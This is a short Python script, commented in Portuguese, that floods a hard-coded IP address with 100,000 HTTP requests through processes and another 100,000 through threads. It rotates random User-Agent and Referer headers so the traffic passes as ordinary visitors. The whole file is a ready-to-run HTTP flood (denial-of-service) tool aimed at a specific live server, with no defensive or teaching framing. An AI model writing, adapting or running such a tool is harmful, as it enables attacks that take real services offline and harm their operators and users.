import requests
import multiprocessing
import threading
import random

# Função para enviar requisições HTTP
def send_request(url):
    user_agents = open('useragents.txt').readlines()
    referers = open('referers.txt').readlines()

    headers = {
        'User-Agent': random.choice(user_agents).strip(),
        'Referer': random.choice(referers).strip()
    }

    try:
        response = requests.get(url, headers=headers)
        print(f"Request to {url} sent. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending request to {url}: {e}")

# Função para enviar múltiplas requisições usando multiprocessing
def send_requests_multiprocessing(url, num_requests):
    for _ in range(num_requests):
        multiprocessing.Process(target=send_request, args=(url,)).start()

# Função para enviar múltiplas requisições usando threads
def send_requests_threads(url, num_requests):
    for _ in range(num_requests):
        threading.Thread(target=send_request, args=(url,)).start()

# URL alvo e número de requisições
url = 'http://142.171.195.145/HIT'
num_requests = 100000

# Enviar requisições usando multiprocessing
send_requests_multiprocessing(url, num_requests)

# Enviar requisições usando threads
send_requests_threads(url, num_requests)